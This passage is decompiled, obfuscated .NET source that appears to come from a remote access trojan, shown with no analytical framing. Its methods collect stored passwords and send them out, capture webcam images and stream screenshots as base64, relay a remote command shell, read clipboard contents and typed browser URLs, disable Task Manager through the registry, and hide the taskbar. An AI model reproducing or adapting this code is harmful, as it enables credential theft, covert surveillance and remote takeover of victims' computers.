			((PrintDocument)u3j9LRhdbuqU).Print();
			array = null;
			Tempdata = null;
			num = 0;
			((Component)(object)u3j9LRhdbuqU).Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string TdYkYpDa121()
	{
		try
		{
			string text = null;
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text2 in array)
			{
				text = text + "*" + text2;
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void QSWSDxTR122(int DelayInSeconds)
	{
		DateTime dateTime = DateTime.Now.AddSeconds(DelayInSeconds);
		TimeSpan timeSpan;
		do
		{
			timeSpan = dateTime.Subtract(DateTime.Now);
			Application.DoEvents();
			Thread.Sleep(100);
		}
		while (timeSpan.TotalSeconds > 0.0);
	}

	private long fBX8d2jC123(string FileName)
	{
		long length = default(long);
		try
		{
			FileInfo fileInfo = new FileInfo(FileName);
			length = fileInfo.Length;
			return length;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return length;
		}
	}

	private void oeqLbd04124()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (!IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 4);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void XsRst465125()
	{
		try
		{
			string lpClassName = "ProgMan";
			string lpWindowName = null;
			IntPtr hWnd = FindWindow(ref lpClassName, ref lpWindowName);
			hWnd = GetWindow(hWnd, 5u);
			if (IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void V0L0tka4126()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tJrSd1cQ127()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			string lpszClassName = "Shell_TrayWnd";
			string lpszWindow = null;
			IntPtr hwnd = FindWindowEx(zero, zero2, ref lpszClassName, ref lpszWindow);
			IntPtr zero3 = IntPtr.Zero;
			lpszWindow = "BUTTON";
			lpszClassName = null;
			IntPtr hWnd = FindWindowEx(hwnd, zero3, ref lpszWindow, ref lpszClassName);
			ShowWindow(hWnd, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void TlWKYRYD128()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SSVaGqnb129()
	{
		try
		{
			string lpClassName = "Shell_TrayWnd";
			string lpWindowName = null;
			long num = (long)FindWindow(ref lpClassName, ref lpWindowName);
			ShowWindow((IntPtr)num, 9);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void vRddgi94130()
	{
		try
		{
			try
			{
				process_0.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				EoA3n31.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				Yomi430.Close();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				tBwfK29.Close();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				opAkC28.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				Z8NUR103.Close();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				uISHH62sXdzV153.Close();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				p9Coj68.Close();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				ZJhW978.Close();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				wgqVq93.Close();
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				GmCMf98.Close();
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				lZGjY83.Close();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				k90ic123.Close();
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				BJ1JM88.Close();
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				XNMeXlFxnPVY143.Close();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				qyE5LC5ZUuyt158.Close();
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				qyE5LC5ZUuyt158.Close();
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				XkRQ7milvkkb128.Close();
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				CVAg9113.Close();
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				x23HEvnWdEd0133.Close();
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				VgtCN108.Close();
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				auDL0tRoGKYp148.Close();
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				WDKFAWJ4RRDd138.Close();
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				OD75s118.Close();
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				maQSv73.Close();
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
			try
			{
				e1YXvdvwVJE1168 = true;
				YwURRa1UV4pg166 = false;
				bool_0 = false;
				aUY3V21 = null;
				FBsrB22 = "Disconnect";
				SendMessageA(YnCMi54, 1035, 0, 0);
			}
			catch (Exception projectError26)
			{
				ProjectData.SetProjectError(projectError26);
				ProjectData.ClearProjectError();
			}
			try
			{
				UG76J72.Abort();
			}
			catch (Exception projectError27)
			{
				ProjectData.SetProjectError(projectError27);
				ProjectData.ClearProjectError();
			}
			try
			{
				KzgFk77.Abort();
			}
			catch (Exception projectError28)
			{
				ProjectData.SetProjectError(projectError28);
				ProjectData.ClearProjectError();
			}
			try
			{
				xJgZX82.Abort();
			}
			catch (Exception projectError29)
			{
				ProjectData.SetProjectError(projectError29);
				ProjectData.ClearProjectError();
			}
			try
			{
				wbogF87.Abort();
			}
			catch (Exception projectError30)
			{
				ProjectData.SetProjectError(projectError30);
				ProjectData.ClearProjectError();
			}
			try
			{
				pEpIJ92.Abort();
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				ProjectData.ClearProjectError();
			}
			try
			{
				RPMHZ97.Abort();
			}
			catch (Exception projectError32)
			{
				ProjectData.SetProjectError(projectError32);
				ProjectData.ClearProjectError();
			}
			try
			{
				cn4wi102.Abort();
			}
			catch (Exception projectError33)
			{
				ProjectData.SetProjectError(projectError33);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_0.Abort();
			}
			catch (Exception projectError34)
			{
				ProjectData.SetProjectError(projectError34);
				ProjectData.ClearProjectError();
			}
			try
			{
				bi9Tn112.Abort();
			}
			catch (Exception projectError35)
			{
				ProjectData.SetProjectError(projectError35);
				ProjectData.ClearProjectError();
			}
			try
			{
				abjUK117.Abort();
			}
			catch (Exception projectError36)
			{
				ProjectData.SetProjectError(projectError36);
				ProjectData.ClearProjectError();
			}
			try
			{
				wehok122.Abort();
			}
			catch (Exception projectError37)
			{
				ProjectData.SetProjectError(projectError37);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_1.Abort();
			}
			catch (Exception projectError38)
			{
				ProjectData.SetProjectError(projectError38);
				ProjectData.ClearProjectError();
			}
			try
			{
				kh52f4dXFZDZ132.Abort();
			}
			catch (Exception projectError39)
			{
				ProjectData.SetProjectError(projectError39);
				ProjectData.ClearProjectError();
			}
			try
			{
				bfcOhlO272Z1137.Abort();
			}
			catch (Exception projectError40)
			{
				ProjectData.SetProjectError(projectError40);
				ProjectData.ClearProjectError();
			}
			try
			{
				CDCR5mf45Njl142.Abort();
			}
			catch (Exception projectError41)
			{
				ProjectData.SetProjectError(projectError41);
				ProjectData.ClearProjectError();
			}
			try
			{
				thread_2.Abort();
			}
			catch (Exception projectError42)
			{
				ProjectData.SetProjectError(projectError42);
				ProjectData.ClearProjectError();
			}
			try
			{
				VIcXcTBen0d2152.Abort();
			}
			catch (Exception projectError43)
			{
				ProjectData.SetProjectError(projectError43);
				ProjectData.ClearProjectError();
			}
			try
			{
				kCSzEl2Vv4VC157.Abort();
			}
			catch (Exception projectError44)
			{
				ProjectData.SetProjectError(projectError44);
				ProjectData.ClearProjectError();
			}
			GC.Collect();
		}
		catch (Exception projectError45)
		{
			ProjectData.SetProjectError(projectError45);
			ProjectData.ClearProjectError();
		}
	}

	private void process_0_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (!string.IsNullOrEmpty(e.Data))
			{
				stringBuilder.Append("/CMDCMDGO/");
				stringBuilder.Append(e.Data);
				if (!(e.Data!.StartsWith("Microsoft") | e.Data!.StartsWith("(C)") | e.Data!.StartsWith("Copyright")))
				{
					M5FtORrWPKL4155.WriteLine((object?)stringBuilder);
					M5FtORrWPKL4155.Flush();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void g0y87l63132()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Form val = new Form();
			val.set_TopMost(true);
			MessageBox.Show((IWin32Window)(object)val, string_2, string_3, dMwpf48, WGAIZ47);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string method_4()
	{
		try
		{
			string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string text = null;
			int num = 1;
			while (true)
			{
				string name2 = "url" + num;
				string text2 = (string)registryKey.GetValue(name2);
				if (text2 == null)
				{
					break;
				}
				text = text + "*" + text2;
				num = checked(num + 1);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
	private static extern void mciSendStringA_1(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

	private void cSGCzwSK135()
	{
		try
		{
			mciSendStringA_1("set CDAudio door open", pOtZT65, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_5()
	{
		try
		{
			mciSendStringA_1("set CDAudio door closed", pOtZT65, 127, 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private int Kab8ayE3137(ref kOi523r7DYBk45 dm)
	{
		return Yf5vKu7h138(ref dm, -1);
	}

	private int Yf5vKu7h138(ref kOi523r7DYBk45 dm, int iModeNum)
	{
		return hWm1w3KbI0E346.EnumDisplaySettings(null, iModeNum, ref dm);
	}

	private void qXWfFuuv139(kOi523r7DYBk45 dm)
	{
		hWm1w3KbI0E346.ChangeDisplaySettings(ref dm, 0);
	}

	private void fnzp5Hb6140(bool enable)
	{
		try
		{
			if (Conversions.ToDouble(rS70A51) < 6.0)
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", RuntimeHelpers.GetObjectValue(Interaction.IIf(enable, (object)0, (object)1)), RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	private void dDDjqm0w142(bool start)
	{
		try
		{
			int desktopWindow = GetDesktopWindow();
			if (start)
			{
				GClass0.SendMessage((IntPtr)desktopWindow, 274u, (IntPtr)61760, (IntPtr)0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RCfTjNug143(object swpass)
	{
		try
		{
			CVhLK4CIOQbv49 cVhLK4CIOQbv = new CVhLK4CIOQbv49();
			string text = cVhLK4CIOQbv.M2oxGSXWy6nv225();
			string text2 = cVhLK4CIOQbv.vkA87yDeiqsp237();
			string text3 = cVhLK4CIOQbv.method_0();
			string text4 = cVhLK4CIOQbv.AN24zvdBOt5t229();
			string text5 = cVhLK4CIOQbv.FeDtF3ZJPWT3233();
			string text6 = cVhLK4CIOQbv.THSmXsprtrWd234();
			string text7 = cVhLK4CIOQbv.bqNe8U86YRY5230();
			string text8 = cVhLK4CIOQbv.method_1();
			string text9 = cVhLK4CIOQbv.O2X0Kdwl0PY6236();
			string text10 = cVhLK4CIOQbv.KpxosgwoQnyV238();
			string text11 = cVhLK4CIOQbv.zWxKiyFUkyC7217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			NewLateBinding.LateCall(swpass, (Type)null, "WriteLine", new object[1] { "/PSWRECOV/" + method_2(Conversions.ToString(obj), "&%#@?,:*") }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swpass, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool FGTMZeXg144(string name)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = 0;
			if (0 < processes.Length)
			{
				Process process = processes[num];
				int num2 = default(int);
				if (process.ProcessName.StartsWith(name))
				{
					num2 = checked(num2 + 1);
				}
				if (num2 == 0)
				{
					return false;
				}
				return true;
			}
			bool result = default(bool);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private int method_6(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}

	private void xi22Ra4T146()
	{
		try
		{
			I2TFX19 = ((Computer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Clipboard().GetText();
			I2TFX19 = I2TFX19.Replace("\r\n", "***");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void n2ytsiNn147(object Tempdata)
	{
		while (true)
		{
			try
			{
				if (Operators.CompareString(string_0, "Connect", false) == 0)
				{
					string lpszWindowName = Conversions.ToString(Tempdata);
					YnCMi54 = capCreateCaptureWindowA(ref lpszWindowName, 0, 0, 0, 320, 240, int_0, 0);
					SendMessageA(YnCMi54, 1034, 0, 0);
					string_0 = "";
				}
				else if (Operators.CompareString(aUY3V21, "Image", false) == 0 && YwURRa1UV4pg166)
				{
					string_6 = aUY3V21;
					aUY3V21 = "";
					SendMessageA(YnCMi54, 1084, 0, 0);
					SendMessageA(YnCMi54, 1054, 0, 0);
					Thread thread = new Thread(JlY7yDEY148);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
					thread.Join();
				}
				else if (Operators.CompareString(aUY3V21, "Capture", false) == 0 && bool_0)
				{
					string_6 = aUY3V21;
					SendMessageA(YnCMi54, 1084, 0, 0);
					SendMessageA(YnCMi54, 1054, 0, 0);
					Thread thread2 = new Thread(JlY7yDEY148);
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start();
					thread2.Join();
				}
				else if (Operators.CompareString(aUY3V21, "Capture2", false) == 0 && bool_0)
				{
					string_6 = aUY3V21;
					SendMessageA(YnCMi54, 1084, 0, 0);
					SendMessageA(YnCMi54, 1054, 0, 0);
					Thread thread3 = new Thread(JlY7yDEY148);
					thread3.SetApartmentState(ApartmentState.STA);
					thread3.Start();
					thread3.Join();
				}
				else if (Operators.CompareString(FBsrB22, "Disconnect", false) == 0)
				{
					SendMessageA(YnCMi54, 1035, 0, 0);
					FBsrB22 = "";
					break;
				}
				Thread.Sleep(50);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(50);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void JlY7yDEY148()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		string text = null;
		checked
		{
			try
			{
				S4WqH55 = Clipboard.GetDataObject();
				eZwmM56 = (Image)(Bitmap)S4WqH55.GetData(DataFormats.Bitmap);
				MemoryStream memoryStream = new MemoryStream();
				Bitmap val = new Bitmap(320, 240, (PixelFormat)135173);
				if (Operators.CompareString(string_6, "Capture", false) == 0)
				{
					eZwmM56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else if (eZwmM56.get_Width() > 320)
				{
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.set_InterpolationMode((InterpolationMode)7);
					val2.set_CompositingQuality((CompositingQuality)2);
					val2.DrawImage(eZwmM56, 0, 0, 320, 240);
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				else
				{
					eZwmM56.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				}
				memoryStream.Capacity = (int)memoryStream.Length;
				byte[] buffer = memoryStream.GetBuffer();
				text = Convert.ToBase64String(buffer);
				eZwmM56.Dispose();
				inEgh17 = (int)memoryStream.Length;
				memoryStream.Flush();
				memoryStream.Dispose();
				memoryStream.Close();
				buffer = null;
				try
				{
					string text2 = string_6;
					if (Operators.CompareString(text2, "Image", false) == 0)
					{
						fy7N275.WriteLine("/WEBIMAGE/" + text);
						fy7N275.Flush();
					}
					else
					{
						fy7N275.WriteLine("/WEBCAPTR/" + text);
						fy7N275.Flush();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					e1YXvdvwVJE1168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				text = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text3 = string_6;
					if (Operators.CompareString(text3, "Image", false) == 0)
					{
						fy7N275.WriteLine("/WEBIMAGE/" + text);
						fy7N275.Flush();
					}
					else
					{
						fy7N275.WriteLine("/WEBCAPTR/" + text);
						fy7N275.Flush();
					}
					text = null;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					e1YXvdvwVJE1168 = true;
					ProjectData.ClearProjectError();
					return;
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Fmgr1tDn149()
	{
		try
		{
			if (Operators.CompareString(I2TFX19, (string)null, false) == 0)
			{
				((Computer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Clipboard().Clear();
			}
			else
			{
				((Computer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Clipboard().SetText(I2TFX19, (TextDataFormat)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7()
	{
		try
		{
			Process process = new Process();
			string text = null;
			string text2 = null;
			string text3 = null;
			Process[] processes = Process.GetProcesses(".");
			for (int i = 0; i < processes.Length; i = checked(i + 1))
			{
				process = processes[i];
				if (process.MainWindowTitle.Length > 0)
				{
					text = text + process.MainWindowTitle.ToString() + "²";
					text2 = text2 + process.Id + "³";
					text3 = text + "±" + text2;
				}
			}
			streamWriter_2.WriteLine("/REFRWIND/" + text3);
			streamWriter_2.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void BZpWG151()
	{
		List<Rectangle> list = c3pIySlntHF1171;
		Rectangle item = new Rectangle(0, 0, phHkNteWaHo6169, Jz5HFJmRryCQ170);
		list.Add(item);
		List<Rectangle> list2 = c3pIySlntHF1171;
		checked
		{
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0), 0, phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list2.Add(item);
			List<Rectangle> list3 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 1)), 0, phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list3.Add(item);
			List<Rectangle> list4 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 2)), 0, phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list4.Add(item);
			List<Rectangle> list5 = c3pIySlntHF1171;
			item = new Rectangle(0, (int)Math.Round((double)FM1Mf53.Height / 4.0), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list5.Add(item);
			List<Rectangle> list6 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0), (int)Math.Round((double)FM1Mf53.Height / 4.0), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list6.Add(item);
			List<Rectangle> list7 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 1)), (int)Math.Round((double)FM1Mf53.Height / 4.0), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list7.Add(item);
			List<Rectangle> list8 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 2)), (int)Math.Round((double)FM1Mf53.Height / 4.0), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list8.Add(item);
			List<Rectangle> list9 = c3pIySlntHF1171;
			item = new Rectangle(0, (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 1)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list9.Add(item);
			List<Rectangle> list10 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0), (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 1)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list10.Add(item);
			List<Rectangle> list11 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 1)), (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 1)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list11.Add(item);
			List<Rectangle> list12 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 2)), (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 1)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list12.Add(item);
			List<Rectangle> list13 = c3pIySlntHF1171;
			item = new Rectangle(0, (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 2)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list13.Add(item);
			List<Rectangle> list14 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0), (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 2)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list14.Add(item);
			List<Rectangle> list15 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 1)), (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 2)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list15.Add(item);
			List<Rectangle> list16 = c3pIySlntHF1171;
			item = new Rectangle((int)Math.Round((double)FM1Mf53.Width / 4.0 + (double)(phHkNteWaHo6169 * 2)), (int)Math.Round((double)FM1Mf53.Height / 4.0 + (double)(Jz5HFJmRryCQ170 * 2)), phHkNteWaHo6169, Jz5HFJmRryCQ170);
			list16.Add(item);
		}
	}

	private void uOKcW152(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		try
		{
			while (RZrtR14)
			{
				try
				{
					string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
					string text = null;
					EncoderParameters val = new EncoderParameters(1);
					val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
					ImageCodecInfo val2 = method_1("image/jpeg");
					Bitmap val3 = new Bitmap(FM1Mf53.Width, FM1Mf53.Height, (PixelFormat)135173);
					checked
					{
						phHkNteWaHo6169 = (int)Math.Round((double)FM1Mf53.Width / 4.0);
						Jz5HFJmRryCQ170 = (int)Math.Round((double)FM1Mf53.Height / 4.0);
						Bitmap val4 = new Bitmap(phHkNteWaHo6169, Jz5HFJmRryCQ170, (PixelFormat)135173);
						Size size = new Size(phHkNteWaHo6169, Jz5HFJmRryCQ170);
						Graphics val5 = Graphics.FromImage((Image)(object)val3);
						val5.CopyFromScreen(FM1Mf53.X, FM1Mf53.Y, 0, 0, FM1Mf53.Size, (CopyPixelOperation)13369376);
						int num = 0;
						do
						{
							try
							{
								Bitmap val6 = val3.Clone(c3pIySlntHF1171[num], (PixelFormat)135173);
								val5 = Graphics.FromImage((Image)(object)val4);
								val5.set_InterpolationMode((InterpolationMode)7);
								val5.set_CompositingQuality((CompositingQuality)2);
								val5.DrawImage((Image)(object)val6, 0, 0, phHkNteWaHo6169, Jz5HFJmRryCQ170);
								MemoryStream memoryStream = new MemoryStream();
								if (Conversions.ToDouble(array[0]) > 75.0)
								{
									((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
								}
								else
								{
									((Image)val4).Save((Stream)memoryStream, val2, val);
								}
								memoryStream.Capacity = (int)memoryStream.Length;
								try
								{
									if (num < 10)
									{
										string_7 = "0" + Conversions.ToString(num);
									}
									else
									{
										string_7 = Conversions.ToString(num);
									}
									if (memoryStream.Length != P2GJS8bxDSeV172[num])
									{
										byte[] buffer = memoryStream.GetBuffer();
										text = Convert.ToBase64String(buffer);
										buffer = null;
										try
										{
											streamWriter_0.WriteLine("/STARTSE0/" + string_7 + text);
											streamWriter_0.Flush();
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
											return;
										}
										int_2++;
									}
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
